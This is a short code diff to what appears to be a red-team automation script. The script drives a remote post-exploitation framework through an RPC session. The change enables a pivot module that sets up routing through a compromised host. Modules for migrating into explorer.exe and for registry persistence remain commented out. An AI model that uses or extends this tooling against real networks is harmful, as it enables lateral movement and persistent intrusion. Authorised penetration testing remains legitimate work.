@@ -5,7 +5,7 @@ import stage2.payloadDelivery.multi.httpshandler as httpshandler
 import stage3.getuid as getuid
 # import stage3.internalC2.windows.migrate64 as migrate64
 # import stage3.persistence.registry.persistence as persistence
-# import stage3.internalC2.multi.pivot as pivot
+import stage3.internalC2.multi.pivot as pivot
 import subprocess
 
 # Declare variables
@@ -25,13 +25,11 @@ def main():
     sid = session_list.init(client, lhost='%s:443' %MSGRPC_IP)
     #Getuid command
     getuid.init(client,sid)
+    #Create pivot by configuring routing
+    pivot.init(client,sid)
     print("Finished!")
-
-
     #Migrate to explorer.exe
     #migrate64.init(client,sid)
-    #Create pivot by configuring routing
-    #pivot.init(client,sid)
     #Establish persistence
     #persistence.init(client,sid)
 
